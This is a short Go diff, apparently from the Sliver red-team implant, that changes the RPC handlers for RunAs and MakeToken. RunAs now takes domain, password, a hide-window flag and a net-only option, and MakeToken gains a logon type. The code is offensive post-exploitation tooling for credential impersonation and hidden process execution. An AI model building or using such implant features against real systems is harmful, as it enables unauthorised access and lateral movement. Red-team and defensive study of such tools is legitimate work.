@@ -152,10 +152,12 @@ func runAsHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	out, err := priv.RunProcessAsUser(runAsReq.Username, runAsReq.ProcessName, runAsReq.Args)
-	runAs := &sliverpb.RunAs{
-		Output: out,
+	show := 10
+	if runAsReq.HideWindow {
+		show = 0
 	}
+	err = priv.RunAs(runAsReq.Username, runAsReq.Domain, runAsReq.Password, runAsReq.ProcessName, runAsReq.Args, show, runAsReq.NetOnly)
+	runAs := &sliverpb.RunAs{}
 	if err != nil {
 		runAs.Response = &commonpb.Response{Err: err.Error()}
 	}
@@ -424,7 +426,7 @@ func makeTokenHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	makeTokenResp := &sliverpb.MakeToken{}
-	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password)
+	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password, makeTokenReq.LogonType)
 	if err != nil {
 		makeTokenResp.Response = &commonpb.Response{
 			Err: err.Error(),
